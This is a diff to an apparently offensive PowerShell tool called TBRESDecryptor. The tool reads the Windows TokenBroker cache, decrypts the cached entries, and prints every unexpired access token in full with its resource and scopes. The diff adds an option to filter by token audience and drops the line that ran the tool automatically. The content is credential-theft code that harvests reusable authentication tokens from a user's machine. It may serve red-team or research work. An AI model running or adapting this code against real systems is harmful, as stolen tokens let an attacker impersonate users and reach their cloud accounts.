@@ -5,9 +5,7 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
 Inspired by https://github.com/xpn/WAMBam
 #>
 
-function DecodeJwtPayload {
-    param([string]$Jwt)
-
+function DecodeJwtPayload($Jwt) {
     try {
         $payload = $Jwt.Split(".")[1]
 
@@ -25,20 +23,22 @@ function DecodeJwtPayload {
     }
 }
 
-function Check-Token($AccessToken) {
-    $jwtPayload = DecodeJwtPayload -Jwt $AccessToken
+function Check-Token($AccessToken, $aud) {
+   $jwtPayload = DecodeJwtPayload -Jwt $AccessToken
 
     $exp = ([DateTimeOffset]::FromUnixTimeSeconds($jwtPayload.exp)).LocalDateTime
     if ($exp -lt (Get-Date)) {
         return
     }
 
-    Write-Output ("-" * 100)
-    Write-Output "Valid token $exp"
-    Write-Output "Resource: $($jwtPayload.aud)"
-    Write-Output "Scope/Roles: $($jwtPayload.scp)"
-    Write-Output "Token: $($AccessToken)"
-    Write-Output ("-" * 100)
+    if (-not $aud -or $jwtPayload.aud -eq $aud) {
+        Write-Output ("-" * 100)
+        Write-Output "Valid token $exp"
+        Write-Output "Resource: $($jwtPayload.aud)"
+        Write-Output "Scope/Roles: $($jwtPayload.scp)"
+        Write-Output "Token: $($AccessToken)"
+        Write-Output ("-" * 100)
+    }
 }
 
 function Get-Tokens($decryptedString) {
@@ -84,6 +84,10 @@ function Output-DecryptedData($origFile, $jsonString) {
 }
 
 function Invoke-TBRESDecryptor {
+    param(
+        [string]$aud
+    )
+    
     Write-Output "`n          --++[[ TBRESDecryptor ]]++--`n"
     
     $path = Join-Path $env:LOCALAPPDATA "Microsoft\TokenBroker\Cache"
@@ -106,9 +110,7 @@ function Invoke-TBRESDecryptor {
         }
         
         foreach ($token in $tokens) {
-            Check-Token $token
+            Check-Token -AccessToken $token -aud $aud
         }
     }
 }
-
-Invoke-TBRESDecryptor
